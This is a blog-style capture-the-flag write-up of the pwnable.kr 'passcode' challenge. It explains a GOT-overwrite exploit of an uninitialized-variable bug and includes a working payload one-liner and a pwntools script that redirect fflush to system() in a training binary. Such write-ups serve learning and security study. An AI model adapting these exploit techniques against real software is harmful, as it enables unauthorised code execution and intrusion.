---
layout: post
title: "pwnable.kr: passcode"
date: 2018-09-01 18:01:00 -0500
published: true
---

Learned a lot from
https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html and
https://www.akashtrehan.com/writeups/pwnablekr_todders_bottle/.

The point of this challenge is to teach you about GOT overwrites.

There's a `.plt.got` and `.got.plt` section. I hate computers. `.got.plt`
is the one that you want, as it contains addresses of library functions or
addresses of code to call the linker to go resolve those addresses.

---

```
void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

---

	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
	scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
			printf("Login OK!\n");
			system("/bin/cat flag");
	}
	else{
```

```
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : ian
Welcome ian!
enter passcode1 : 3
Segmentation fault
```

First glance reading the code: `fflush(stdin)` is weird. It can be used to
discard input that's buffered, but not yet printed to screen, but it's
nonstandard.

Second glance: `scanf("%d", passcode1);` should be `&passcode1`.
Recompiling the code throws a warning that makes this obvious. 

Maxing out the name buffer leaves the last 4 bytes in the uninitialized
`passcode1` location. So, we can write any address we want there, and the
first `scanf` will write the next value into that address.

We can't reach `passcode2` via the buffer, though (it's not long enough).
You might consider overwriting the return address of login, but that won't
work, because we can't be able to get through the second `printf()` without
segfaulting.  But! We have the suspicious `fflush`.

`fflush` is libc, so we can do a GOT overwrite and simply replace its
address with that of `system()` in the `text` section of the binary.

So, we:
 * Write `"A"*96 + little_endian(GOT address for fflush)`
 * Write the address we want to jump to (`system` in the binary)

One-liner:
 * `python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "\n" + str(0x80485d7)' | ./passcode`

pwntools script:
```
from pwn import *

# context.log_level = 'debug'

p = process("/home/passcode/passcode")
print util.proc.pidof(p)
# pause() # gdb connect

p.sendline("A"*96 + p32(0x804a004)) # GOT address for fflush

p.sendline(str(0x80485d7)) # address of system()
# p.interactive() # dumps everything. I'm kinda unsure how to fetch the
# output otherwise.
print p.recvall() # jk this does it.
```
